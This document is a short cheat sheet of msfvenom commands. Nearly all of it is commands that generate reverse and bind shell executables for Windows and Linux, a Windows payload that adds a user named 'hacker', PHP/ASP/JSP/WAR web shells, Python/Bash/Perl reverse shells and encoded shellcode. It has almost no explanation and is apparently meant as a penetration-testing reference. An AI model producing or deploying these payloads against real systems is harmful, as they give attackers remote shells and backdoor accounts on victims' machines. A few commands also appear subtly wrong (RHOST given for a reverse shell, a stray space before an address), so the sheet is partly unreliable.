# Msfvenom

## Operating System Payloads

### Windows Payloads <a id="windows-payloads"></a>

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
msfvenom -p windows/meterpreter_reverse_http LHOST=IP LPORT=PORT HttpUserAgent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36" -f exe > shell.exe
msfvenom -p windows/meterpreter/bind_tcp RHOST= IP LPORT=PORT -f exe > shell.exe
msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe > shell.exe
```

### Linux Payloads <a id="linux-payloads"></a>

```text
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf > shell.elf
msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
msfvenom -p linux/x64/shell_bind_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
msfvenom -p linux/x64/shell_reverse_tcp RHOST=IP LPORT=PORT -f elf > shell.elf
```

Add a user in windows with msfvenom:

```text
msfvenom -p windows/adduser USER=hacker PASS=password -f exe > useradd.exe
```

## Web Payloads

PHP

```text
msfvenom -p php/meterpreter_reverse_tcp LHOST= LPORT= -f raw > shell.php
cat shell.php | pbcopy && echo '<?php ' | tr -d '' > shell.php && pbpaste >> shell.php
```

ASP

```text
msfvenom -p windows/meterpreter/reverse_tcp LHOST= LPORT= -f asp > shell.asp
```

JSP

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f raw > shell.jsp
```

WAR

```text
msfvenom -p java/jsp_shell_reverse_tcp LHOST= LPORT= -f war > shell.war
```

## Scripting Payloads

Python

```text
msfvenom -p cmd/unix/reverse_python LHOST= LPORT= -f raw > shell.py
```

Bash

```text
msfvenom -p cmd/unix/reverse_bash LHOST= LPORT= -f raw > shell.sh
```

Perl

```text
msfvenom -p cmd/unix/reverse_perl LHOST= LPORT= -f raw > shell.pl
```

## Memory Corruption Payloads

Creating a msfvenom payload with an encoder while removing bad characters:

```text
msfvenom -p windows/shell_reverse_tcp EXITFUNC=process LHOST=IP LPORT=PORT -f c -e x86/shikata_ga_nai -b "\x0A\x0D"
```

